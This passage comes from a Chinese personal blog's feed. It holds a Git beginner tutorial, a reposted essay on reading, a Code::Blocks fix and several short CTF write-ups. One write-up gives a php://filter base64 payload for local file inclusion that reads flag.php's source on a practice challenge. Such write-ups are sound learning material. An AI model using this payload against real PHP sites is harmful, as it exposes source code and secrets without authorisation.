<p>输入该密码，得到flag。</p>
]]></content>
      <tags>
        <tag>bp</tag>
      </tags>
  </entry>
  <entry>
    <title>Git的介绍、安装和基本提交</title>
    <url>/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/</url>
    <content><![CDATA[<h1 id="Git的优势"><a href="#Git的优势" class="headerlink" title="Git的优势"></a>Git的优势</h1><ul>
<li><p>大部分操作在本地完成，不需要连接互联网</p>
</li>
<li><p>完整性保证（利用Hash值）</p>
</li>
<li><p>尽可能添加数据而不是删除数据或修改数据，从而避免了不可逆操作（为每个版本拍摄快照）</p>
</li>
<li><p>分支操作非常快捷流畅</p>
</li>
<li><p>与Linux命令全面兼容（二者是一个爹）</p>
<span id="more"></span></li>
</ul>
<h1 id="Git的安装"><a href="#Git的安装" class="headerlink" title="Git的安装"></a>Git的安装</h1><p>首先去<a href="https://git-scm.com/download/win">git官网下载</a>并根据自己电脑的位数选择相应的版本</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108191953930.png" alt="image-20220108191953930"></p>
<p>下载完成后安装，选择一个非中文没有空格的目录</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108192101316.png" alt="image-20220108192101316"></p>
<p>然后下一步，按照下面图片的选项即可</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108192700075.png" alt="image-20220108192700075"></p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108192807726.png" alt="image-20220108192807726"></p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108192853679.png" alt="image-20220108192853679"></p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193229371.png" alt="image-20220108193229371"></p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193435463.png" alt="image-20220108193435463"></p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193655903.png" alt="image-20220108193655903"></p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193801302.png" alt="image-20220108193801302"></p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193945547.png" alt="image-20220108193945547"></p>
<p>然后安装即可，装完效果如下</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108194259961.png" alt="image-20220108194259961"></p>
<h1 id="Git在本地的结构"><a href="#Git在本地的结构" class="headerlink" title="Git在本地的结构"></a>Git在本地的结构</h1><p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108194609170.png" alt="image-20220108194609170"></p>
<h1 id="Git和代码托管中心"><a href="#Git和代码托管中心" class="headerlink" title="Git和代码托管中心"></a>Git和代码托管中心</h1><p>代码托管中心有很多，如外网环境下的GitHub、码云，局域网里的GitLab服务器（Git和Github的历史发展没有渊源）代码托管中心的任务是维护远程库</p>
<h1 id="Git的本地库和远程库的交互"><a href="#Git的本地库和远程库的交互" class="headerlink" title="Git的本地库和远程库的交互"></a>Git的本地库和远程库的交互</h1><p>团队内协作（不加入团队不可push修改远程库代码）</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108202115421.png" alt="image-20220108202115421"></p>
<p>跨团队协作</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108211729222.png" alt="image-20220108211729222"></p>
<h1 id="Git命令行操作"><a href="#Git命令行操作" class="headerlink" title="Git命令行操作"></a>Git命令行操作</h1><h2 id="本地库操作"><a href="#本地库操作" class="headerlink" title="本地库操作"></a>本地库操作</h2><h3 id="本地库初始化"><a href="#本地库初始化" class="headerlink" title="本地库初始化"></a>本地库初始化</h3><p>命令：<code>git init</code></p>
<p>效果：<img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108212311272.png" alt="image-20220108212311272"></p>
<p>注意：.git目录中存放的是本地库相关的子目录和文件，不要删除和修改</p>
<h3 id="设置签名"><a href="#设置签名" class="headerlink" title="设置签名"></a>设置签名</h3><p>形式：</p>
<p>用户名：随便输</p>
<p>Email地址：随便输，不存在也没关系</p>
<p>作用：区分不同开发人员</p>
<p>辨析：这里设置的签名和远程库（代码托管中心）的账号和密码一点关系没有</p>
<p>命令：<code>git config user.name 用户名</code>  </p>
<p>​        ：<code>git config user.email 邮件地址</code>    项目级别</p>
<p>​        ：<code>git config --global user.name 用户名</code></p>
<p>​         :  <code>git config --global user.email 邮件地址</code>    系统用户级别</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108214655319.png" alt="image-20220108214655319"></p>
<p>项目级别/仓库级别：仅在当前本地库范围内有效（即只在test文件夹内有效）</p>
<p>系统用户级别：登录当前操作系统的用户范围，如图</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108213618080.png" alt="image-20220108213618080"></p>
<p>若没设置，则默认是系统用户级别，若两个都有，则是项目级别。也就是项目级别优先于系统用户级别。</p>
<p>若二者都没有是不允许的</p>
<p>项目级别用户名和邮件地址保存在.git/config里面，如上图</p>
<p>系统用户级别用户名和邮件地址保存在当前用户文件夹里，如图</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108215432512.png" alt="image-20220108215432512"></p>
<p>通常只设置一个系统用户级别</p>
<h3 id="添加提交和查看状态操作"><a href="#添加提交和查看状态操作" class="headerlink" title="添加提交和查看状态操作"></a>添加提交和查看状态操作</h3><p>查看当前库状态命令：<code>git status</code></p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108220013324.png" alt="image-20220108220013324"></p>
<p>创建文件命令：<code>vim 文件名.文件类型</code>（创建后即使未提交，在windows文件夹中也可看到该文件）</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108220229743.png" alt="image-20220108220229743"></p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108220240175.png" alt="image-20220108220240175"></p>
<p>按I键开始输入内容</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108220517621.png" alt="image-20220108220517621"></p>
<p>编辑完成后按ESC然后输入<code>:wq</code>退出</p>
<p>此时再输入<code>git status</code>可看到</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108221241830.png" alt="image-20220108221241830"></p>
<p>将工作区文件放入暂存区命令：<code>git add 文件名.文件类型</code></p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108221653353.png" alt="image-20220108221653353"></p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193655903.png" alt="image-20220108193655903"></p>
<p>放进去后，在用<code>git status</code>看一下状态，可知test.txt已经进入暂存区</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108222245958.png" alt="image-20220108222245958"></p>
<p>若使用<code>git rm --cached test.txt</code>则又回到此状态</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108221241830.png" alt="image-20220108221241830"></p>
<p>将暂存区文件提交到本地库命令：<code>git commit 文件名.文件类型</code></p>
<p>vim编辑器中输入<code>:set nu</code>来查看行号</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108222950393.png" alt="image-20220108222950393"></p>
<p>然后按I键来进行输入更改备注信息</p>
<p>输入好后按ESC然后输入<code>:wq</code>退出</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108223450538.png" alt="image-20220108223450538"></p>
<p>然后再看一下状态</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108223535612.png" alt="image-20220108223535612"></p>
<p>利用<code>git commit --amend - “新的备注”</code>来更改备注信息，并用<code>git log</code>来查看历史版本</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108224049105.png" alt="image-20220108224049105"></p>
<p>用<code>vim test.txt</code>继续编辑文件，加入一行“d”然后再查看状态</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108224800559.png" alt="image-20220108224800559"></p>
<p>这里用<code>git add test.txt</code>按部就班的进行提交，然后查看状态</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108225112194.png" alt="image-20220108225112194"></p>
<p>然后进行提交，这里用<code>git commit -m &quot;备注&quot; test.txt</code>进行提交，不用再在vim编辑器里输入备注信息</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108225410302.png" alt="image-20220108225410302"></p>
]]></content>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>php://filter 协议</title>
    <url>/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h1 id="php-filter-协议"><a href="#php-filter-协议" class="headerlink" title="php://filter 协议"></a>php://filter 协议</h1><p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/20210711135416691.png" alt="asd"></p>
<p>1是格式<br>2是可选参数，有read和write，字面意思就是读和写（如果不写可选参数2(read或write)，那么网页会自动匹配一个合适的read或write）<br>3是过滤器。主要有四种：字符串过滤器，转换过滤器，压缩过滤器，加密过滤器。filter里可以用一或多个过滤器（中间用|隔开），这也为解题提供了多种方法，灵活运用过滤器是解题的关键。这里的过滤器是把文件flag.php里的代码转换（convert）为base64编码（encode）<br>4是必选参数，后面写你要处理的文件名<br>常用过滤器</p>
<span id="more"></span>

<p>转base64编码：convert.base64-encode</p>
<p>转大写：string.toupper</p>
<p>php://filter还可以绕过，大概就是把不希望执行的语句先编码，这个编码类型可以破坏语句的正常执行<br>（比如base64编码只有64个字符，如果被编码的语句字符在64个字符里找不到对应的，就会忽略，略过它继续编码），然后再解码，这样就可以绕过这个语句了。</p>
<p>例题：</p>
<h1 id="ACTF2020-新生赛Include"><a href="#ACTF2020-新生赛Include" class="headerlink" title="ACTF2020 新生赛Include"></a>ACTF2020 新生赛Include</h1><p>打开题目后审视代码，发现啥也没有</p>
<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170041509.png" alt="image-20211205170041509"></p>
<p>但看到php文件，可以联想文件包含漏洞，然后我们可以用php://filter协议来查看源文件内容。</p>
<p>构造：php://filter/read=convert.base64-encode/recource=flag.php</p>
<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170421228.png" alt="image-20211205170421228"></p>
<p>这句话的意思是我们用base64编码的方式来读文件flag.php；这时页面会显示出源文件flag.php经过base64编码后的内容</p>
<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170455351.png" alt="image-20211205170455351"></p>
<p>然后经过base64解码就可以看到flag<br><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170507361.png" alt="image-20211205170507361"></p>
]]></content>
      <tags>
        <tag>php Filter</tag>
      </tags>
  </entry>
  <entry>
    <title>朋友，你好！欢迎来到我的世界!</title>
    <url>/2021/11/23/hello-world/</url>
    <content><![CDATA[<p>这是我的第一条<a href="https://shl528.top/">博客</a>!在这里我会更新自己觉得有价值的东西，希望这对你能有一些帮助。<br>嗯… 也不知道到写些什么，那就摘一篇我认为很有价值的文章吧！</p>
<h2 id="关于读书（引自罗翔老师）"><a href="#关于读书（引自罗翔老师）" class="headerlink" title="关于读书（引自罗翔老师）"></a>关于读书（引自罗翔老师）</h2><h3 id="一-为什么读书？"><a href="#一-为什么读书？" class="headerlink" title="一.为什么读书？"></a>一.为什么读书？</h3><p>我们为什么要读书？</p>
<span id="more"></span>

<p>你会毫不犹豫的说，因为读书能够获得知识。</p>
<p>那人又为什么要获得知识呢？</p>
<p>我想答案不外乎是，因为知识可以改变人的命运、知识可以让你将来找到一个好工作，知识能够让你摆脱愚昧等等。</p>
<p>宋朝皇帝真宗赵恒说的比大家更为直白：</p>
<p>富家不用买良田，书中自有千锺粟</p>
<p>安居不用架高堂，书中自有黄金屋</p>
<p>出门莫恨无人随，书中车马多如簇</p>
<p>娶妻莫恨无良媒，书中自有颜如玉</p>
<p>男儿若遂平生志，六经勤向窗前读</p>
<p>你看，读书的好处真不少，车子、票子、房子、妻子都有了。</p>
<p>我并不否认读书会带来这些功利价值，但如果只是定睛于读书的功利性价值，那我要非常遗憾的告诉大家，我们在法大学的很多东西，将来可能都没有用处。</p>
<p>做律师，能赚大钱，那我为什么要学高数，难道要用高数数钱吗？</p>
<p>做大官，祖坟能冒烟，那我为什么要学法律，学学关系学、领导学就行了。</p>
<p>功利性读书必然让你接受成功主义的价值观，我们身处的社会弥漫的都是成功主义的哲学，你要成功，你要出名，你要成为人上人。</p>
<p>这几乎主宰了我们一切的价值观。</p>
<p>成功主义将成功作为评估一切价值的尺度，为了成功，你可以不折手段，你可以牺牲一切利益。</p>
<p>大家看过「魔鬼代言人」吧，年轻有为的律师凯文 基洛·里维斯扮演经过不住高薪豪宅的诱惑，带着妻子从家乡来到纽约发展。</p>
<p>在一个又一个成功中迷失了自己，为了追求利益和打赢官司，他放弃了律师操守，为了追逐胜诉，不惜隐瞒证据；他也牺牲了家庭，为了事业，他放弃了家庭，导致妻子自杀。</p>
<p>最后他才发现，他其实是魔鬼的私生子，成功全都来源于魔鬼的操控。魔鬼正是试图通过成功让我们放弃自己安身立命的美好价值。</p>
<p>在影片的结尾，魔鬼说了一句意味深长的话：</p>
<p>虚荣，无疑是我最爱的罪。</p>
<p>功利性读书让你只想成功，无法接受失败。</p>
<p>但我始终认为：</p>
<p>一个人的真正成功不是在于你取得多少辉煌，而是在挫折中，你能不能勇敢的爬起来。只有非功利性阅读，才能让你坦然接受失败。</p>
<p>在大量的与功利无关的文学作品、名人传记中，主人公的失败、困苦、绝望比比皆是。那么多伟大的灵魂，他们也曾有跌倒过的时候，你为什么不能跌倒。</p>
<p>功利性的读书让你只注重外在的功名，而忽视了内心的丰富。</p>
<p>孔门七十二贤，不乏博学多能者，高官厚禄者，但孔子最欣赏的学生却是单纯的颜回，“一箪食，一瓢饮，在陋巷，人不堪其忧，回也不改其乐”。</p>
<p>孔子说颜回好学，“有颜回者好学，不迁怒，不贰过。”也就是说颜回心态平和，情绪稳定，善于改过自新，注重德行。</p>
<p>这种内心的丰富在功利性阅读中，你不可能习得。</p>
<p>功利性读书会让人自高自大，孤标傲世。知识经常会让人骄傲给人带来智力上的优越感，让你瞧不起人，无法与人建立正常的人际关系。曹丕说“文人相轻，自古已然”。</p>
<p>为什么中国的文人总是互相瞧不上，这可能就是知识带来的恶果，因为知识让我们觉得自己与众不同，高人一等。</p>
<p>很多知识分子不懂得如何去配合，只懂得单打独斗，很长一段时间，中国都没有出现世界性的大师，一个很重要的原因，就是这些人过于骄傲。</p>
<p>在座的同学们中会出现大师吗？我不知道，但我想，如果你真的想为人类的进步作出贡献的话，你必须承认自己的无知与有限，必须与他人互相配合。</p>
<p>因此，读书的目的不能仅限于功利，必须去追逐非功利性的价值。</p>
<p>在我看来，读书的真正目的是追求智慧，而非单纯的知识。</p>
<p>从表面上来看，读书是一个一个悖论：让你在求知的过程中越来越觉得自己的无知。这就像苏格拉底所说的“承认自己的无知才是开启智慧的大门”。</p>
<p>庄子说：</p>
<p>吾生也有涯，而知也无涯，以有涯随无涯，殆已</p>
<p>这句话被很多人误读为励志名句。其实庄子的意思完全相反，庄子想说的是，生命是有限的，而知识是无限的，以有限的生命去追逐无限的知识，会把自己搞的非常疲倦的。</p>
<p>所罗门王也说过类似的话，“著书多，没有穷尽；读书多，身体疲倦”。</p>
<p>这些话表面上很消极，但他其实是想告诉我们，知识是无限的，在求知的过程中，必须对无限的知识保持足够的谦卑。</p>
<p>因此，读书首先可以培养自己对未知世界的敬畏。随着阅读的深入，你才能知道知识的大海是没有边界的，我们所知道的真的是太有限了。</p>
<p>读书可以激发我们对未知世界的探索，虽然知识的海洋是无限的，个体生命是有限的，但后人对庄子的误读有合理之处。</p>
<p>正是因为人类有智慧，不同于其他生物，因此我们必须用我们的智慧去探索未知世界的奥秘，然后更加感到宇宙的奇妙，避免人类的狂妄自大。</p>
<h3 id="二-读什么书？"><a href="#二-读什么书？" class="headerlink" title="二.读什么书？"></a>二.读什么书？</h3><p>刚才我们说过，读书的目的有功利性目的和非功利性目的。</p>
<p>前者是为了成功，后者是对前者进行纠偏：为了丰富自己的内心避免受到成功主义的荼毒，通过读书承认自己的有限，在浩瀚的宇宙面前保持足够的谦卑之心去不断探索宇宙的奥秘。</p>
<p>因此，读书也就分功利性阅读与非功利性阅读，前者就是大家从小到大，家长老师让大家好好读的书，没有太多可讲的。</p>
<p>大学四年，功利性阅读当然是必不可少的，你要学好专业，作为将来谋生的工具，你要学好英语，如果你不想将来和国际脱钩。</p>
<p>但更重要的是非功利性阅读，这可以让你感受真正的幸福。</p>
<p>那么，应该读什么书呢？</p>
<p>我觉得还是应该博观约取，厚积薄发。首先要“博观”，要“厚积”，广泛涉猎。</p>
<p>作为文科大学文史哲不分家，因此我们至少要通读重要的文学经典，在文学中，我们可以丰富我们人生的体验，文学来源于现实，虽然从表面上看主人公都是虚构的人物，但他们都是现实的折射。</p>
<p>文学可以让我们知道人生的多样性，人生不同路径的不同结果，它可以告诉学习到面临相同情境应该如何抉择。</p>
<p>文学作品还能极大地培养人的同理心，文学中无数个体的悲欢离合命运多舛，这能让我们体会人生的苦难与无常，我们会思想自己也是血肉之躯，苦难随时也会临到自身，故会感同身受，更会深刻领悟约翰多恩的布道词：</p>
<p>没有人是自成一体、与世隔绝的孤岛，每一个人都是广袤大陆的一部份。如果海浪冲掉了一块岩石，欧洲就减少。如同一个海岬失掉一角，如同你的朋友或者你自己的领地失掉一块。每个人的死亡都是我的哀伤，因为我是人类的一员。所以，不要问丧钟为谁而鸣，它就为你而鸣！</p>
<p>其次，我们必须要了解历史。如果说文学作品是虚构的人物，那历史就是真实人物的真实人生。</p>
<p>通过对历史的阅读，我们能够更深刻地了解人性的复杂，你会对人性的高贵赞叹不已，也会对人性邪恶不寒而栗；通过历史人物,我们也能反省自己，升华自己，去彰显人性的光辉，压制人性的幽暗。</p>
<p>历史中，无数鲜活的个体让我们认识到人性的不完美，从此我们可以拒绝人造的偶像。</p>
<p>正是因为对历的阅读，我才深刻了解法治的精神，因为人的不完美，因此人类的任何群体都有败坏的天性，所以对任何权力都要保持绝对的警惕。</p>
<p>权力导致腐败，绝对权力导致绝对腐败，任何权力都要套上法治的镣铐。</p>
<p>再次，哲学书也应看看。哲学是对人生观的探讨，这里说的哲学不是大家以前上课时学的哲学，那只是哲学中一个的门类，不过一家之言而已。</p>
<p>苏格拉底、柏拉图、亚里斯多德、奥古斯丁、阿奎那、西塞罗、马丁路德、加尔文、孟德斯鸠、洛克、波普尔、哈耶克等等。</p>
<p>这一连串名单，人类群星璀璨时，够你一生去阅读，通过对各类哲学著作的阅读，你可以追寻先贤的脚踪，去思索人从何而来，归向何方，一生应为何而活。</p>
<p>有兴趣的话，大家可以先从入门看起，如杜兰特的「哲学的故事」，看完后，你也许会慢慢爱上哲学。</p>
<p>除了文史哲，美术、音乐等各种艺术书籍都可涉猎。一个爱好艺术的人，他离善道应该更近一点。</p>
<p>不过这方面，我没有资格谈论，我自己艺术细胞很少。只看过几本美术史的著作，感觉很舒服，今后我也会在这方面补补课。</p>
<p>当然，“博观”“厚积”之后，就是约取。孟子说，尽信书不如无书，读书是对前人的经验的认识，必须有一个筛选的过程，绝不可人云亦云，要注意比较鉴别、明辨是非。</p>
<p>“吾爱吾师，吾更爱真理”，读书就像在真理之路的交通工具，有的交通工具走得快点，有的交通工具走的慢点，飞机飞得比火车快，但航班经常延误，而且到不了小村小寨，各种交通工具都有自己的利弊，因此什么书都可以读点，不可厚此薄彼。</p>
<p>另外，再好的交通工具如果走错方向，南辕北辙，那就麻烦了。通过读书，可以慢慢树立正确的价值观，就如选择正确的行驶路线。</p>
<h3 id="三-怎么读书？"><a href="#三-怎么读书？" class="headerlink" title="三.怎么读书？"></a>三.怎么读书？</h3><p>那么如何去读这些书呢？</p>
<p>这首先涉及去哪寻找这些书，老师们都会有自己的喜欢的书单上课时会给大家推荐，每年假期，我也会给大家推荐，如果大家有兴趣，也可以关注。</p>
<p>大学期间，同学们应该充分利用图书馆的资源，法大虽然不大但图书馆还是不错的，至少大学生应该阅读的主要书籍都有。</p>
<p>另外，如果大家想看新书的话，可以逛书店，经济条件允许的话，最好还是上书店买书。否则都在网上购书,实体书店也就都倒闭了。</p>
<p>给大家推荐几个书店，一个就是位于北大和清华之间的万圣书园，周末叫上三五知己，在万圣坐坐，看看书。谈恋爱的同学可以在书店旁边的醒客咖啡谈情说爱，顺便看看书，很浪漫、很温馨、很典雅。</p>
<p>另外一个稍微远点，在美术馆附近的三联书店的总店，也很不错，去故宫、景山公园是可以顺便逛逛。这两个书店的网站上每个月都有新书推荐，大家可以参考。</p>
<p>其次，大家也可以参加或组织读书小组，多人共同读书，每月读一两本好书，人不要太多，五六个人就可以了，每次由一两个同学做主报告人,其他同学参与讨论，在互动讨论中，你会有很多收获。</p>
<p>豆瓣上的读书小组也可以参加，但是我还是倾向人与人在现实空间中面对面的接触，这不仅可以读书，也可以阅人。</p>
<p>再次，关于读书的方法，一般的书籍都可以泛读，不要抱着读一本书要学多少东西的心态，否则就回到了功利主义的路子。</p>
<p>很多同学经常向我抱怨，老师我读书老记不住，读了后面就忘了前面。</p>
<p>其实为什么要记住呢？是为了写文章，还是为了在别人面前炫耀呢？</p>
<p>读书就是为了读书而读书，陶渊明说：</p>
<p>好读书，不求甚解；每有会意，便欣然忘食</p>
<p>在读书过程中，有那么片刻你能达到与书同乐，欣然忘食的境界，那就达到读书的目的了。你的内心就在潜移默化中慢慢被洗涤了。</p>
<p>当然，如果你觉得一本书泛读之后，非常不错，那你可以再读精读，对于书中的让你感动不已的语句，你可以记录下来，甚至可以发在微博上，人人上，让大家分享你的心得。</p>
<p>有很多书是可以反复读的。随着年龄的增长，阅历的丰富，同样一本书在不同时刻会给你不同的感动。</p>
<p>在大学四年中，我想大家至少要有几本放在床头的书，没事就翻翻，就像老朋友一样，有空就聊聊，等到书翻破翻黄，你对这个老朋友可能就会有更深的了解。</p>
<p>最后，很多书籍可以利用零碎的时间来读，比如坐公车坐地铁做火车坐飞机时，周末去逛万圣书店的路途中等等。</p>
<p>记得当年我读林达的「近距离看美国系列」 这个书学习法律的同学是一定要看的好像都是在做公车的时候看完的。</p>
<p>有同学会说，在车上看书伤眼睛，或者不方便，这可能也有道理，但是我看不少同学在无论多么拥挤的车上，也照样在看手机，玩游戏。如果把这些时间放在看书上，也许你会更充实。</p>
<p>卡夫卡说，一本书，必须是一把凿开我们心中冰海的利斧。</p>
<p>亲爱的同学们，你的心中有冰海吗？那么，就从现在开始读书吧！</p>
]]></content>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>“解决codeblocks无法运行c++程序&quot;</title>
    <url>/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/</url>
    <content><![CDATA[<p>下载Codeblocks后，创建新程序后，发现点击运行后无法弹出控制台，如图</p>
<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127120305308.png" alt="image-20211127120305308"></p>
<span id="more"></span>

<p>#法1</p>
<p>查看compiler setting中的路径，如下图</p>
<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127120458845.png" alt="image-20211127120458845"></p>
<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127120607794.png" alt="image-20211127120607794"></p>
<p>修改MinGW的路径后，解决问题</p>
<p>#法2（法1未解决）</p>
<p>路径正常，修改路径后显示</p>
<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127120747653.png" alt="image-20211127120747653"></p>
<p>即缺少GNU GCC Compiler，说白了就是MinGW文件不完整，尝试删除WinGW文件夹，然后重新下载</p>
<p>下载地址：链接：<a href="https://pan.baidu.com/s/12OXmsCeZM2zIrK95WTs7Ag">https://pan.baidu.com/s/12OXmsCeZM2zIrK95WTs7Ag</a>    提取码：axen</p>
<p>将该压缩包解压后，解决问题</p>
<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127121331465.png" alt="image-20211127121331465"></p>
]]></content>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战 2019Havefun</title>
    <url>/2021/12/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019Havefun/</url>
    <content><![CDATA[<p>打开题目后啥也没有，按F12查看代码，发现线索</p>
<p><img src="/2021/12/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019Havefun/image-20211205161615155.png" alt="image-20211205161615155"></p>
<span id="more"></span>

<p>很明显要用GET的方式让cat=dog</p>
<p><img src="/2021/12/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019Havefun/image-20211205161708933.png" alt="image-20211205161708933"></p>
<p>进入后得到flag</p>
<p><img src="/2021/12/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019Havefun/image-20211205161730917.png" alt="image-20211205161730917"></p>
]]></content>
      <tags>
        <tag>GET</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战 2019 EasySQL</title>
    <url>/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/</url>
    <content><![CDATA[<p>打开题目如下</p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203192806308.png" alt="image-20211203192806308"></p>
<p>典型的爆破，提示他是cl4y，则猜测用户名为cl4y，开始爆破</p>
<span id="more"></span>

